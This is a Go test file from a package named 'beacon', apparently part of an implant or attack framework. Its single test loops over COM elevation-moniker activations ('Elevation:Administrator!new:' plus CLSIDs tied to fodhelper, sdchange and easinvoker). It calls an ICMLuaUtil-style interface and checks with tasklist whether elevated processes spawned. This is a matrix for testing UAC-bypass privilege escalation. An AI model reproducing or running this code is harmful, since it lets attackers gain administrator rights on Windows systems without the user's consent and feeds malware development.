package beacon

import (
	"fmt"
	"os/exec"
	"runtime"
	"strings"
	"syscall"
	"testing"
	"unsafe"
)

func TestDbgBindMatrix(t *testing.T) {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()
	procCoInitializeEx.Call(0, 2)
	defer procCoUninitialize.Call()

	iidUnk, _ := guidFromString("00000000-0000-0000-C000-000000000046")
	classes := map[string]string{
		"fodhelper":  "{C6B167EA-DB3E-4659-BADC-D1CCC00EFE9C}",
		"sdchange":   "{E1BA41AD-4A1D-418F-AABA-3D1196B423D3}",
		"easinvoker": "{18FBD4BC-16EA-47f2-8AD0-868C1269C79A}",
	}

	procs := func() []string {
		out, _ := exec.Command("tasklist", "/fo", "csv", "/nh").Output()
		var names []string
		for _, line := range strings.Split(string(out), "\n") {
			parts := strings.Split(line, ",")
			if len(parts) > 0 {
				n := strings.Trim(parts[0], `"`)
				switch n {
				case "fodhelper.exe", "sdchange.exe", "easinvoker.exe":
					names = append(names, n)
				}
			}
		}
		return names
	}

	for name, clsid := range classes {
		monPtr, _ := syscall.UTF16PtrFromString("Elevation:Administrator!new:" + clsid)
		for _, ctx := range []uintptr{0, 0x4, 0x15} {
			var p unsafe.Pointer
			var r1 uintptr
			if ctx != 0 {
				b := bindOpts3{cbStruct: uint32(unsafe.Sizeof(bindOpts3{})), dwClassContext: uint32(ctx)}
				r1, _, _ = procCoGetObject.Call(uintptr(unsafe.Pointer(monPtr)), uintptr(unsafe.Pointer(&b)), uintptr(unsafe.Pointer(&iidUnk)), uintptr(unsafe.Pointer(&p)))
			} else {
				r1, _, _ = procCoGetObject.Call(uintptr(unsafe.Pointer(monPtr)), 0, uintptr(unsafe.Pointer(&iidUnk)), uintptr(unsafe.Pointer(&p)))
			}
			alive := procs()
			if p != nil {
				syscall.Syscall((*icmluaUtilVtbl)(p).Release, 1, uintptr(p), 0, 0)
			}
			t.Logf("%-10s ctx=0x%-3x -> 0x%08x spawned=%v", name, ctx, uint32(r1), alive)
		}
	}
	fmt.Println("done")
}
